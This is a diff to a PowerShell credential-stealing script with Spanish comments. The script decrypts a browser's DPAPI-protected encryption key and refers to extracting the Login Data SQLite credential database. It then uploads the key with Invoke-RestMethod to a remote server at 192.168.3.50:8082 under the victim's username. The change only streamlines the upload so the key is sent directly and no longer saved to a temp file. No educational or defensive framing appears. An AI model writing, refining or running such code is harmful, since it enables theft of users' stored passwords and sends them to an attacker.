@@ -1,4 +1,3 @@
-$cont = "$env:TEMP/data_msg.txt" 
 $server = "http://192.168.3.50:8082/"
 
 
@@ -27,7 +26,7 @@ $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKe
 
 # Convertir la clave binaria a base64
 $base64Key = [Convert]::ToBase64String($dpapiKey) 
-echo "PASSWORD: $base64Key" >> $cont
+$cont = $base64Key
 
 
 #Extraer y enviar LOGIN DATA (BASE DE DATOS con credenciales SQLITE)
@@ -47,8 +46,7 @@ else {
 }
 
 # Envio de clave de cifrado
-Invoke-RestMethod -Uri $server/password_$env:USERNAME -Method PUT -Body (Get-Content $cont -Raw) -ContentType "text/plain"
-
+Invoke-RestMethod -Uri $server/password_$env:USERNAME -Method PUT -Body ($cont) -ContentType "text/plain"
 
 
 
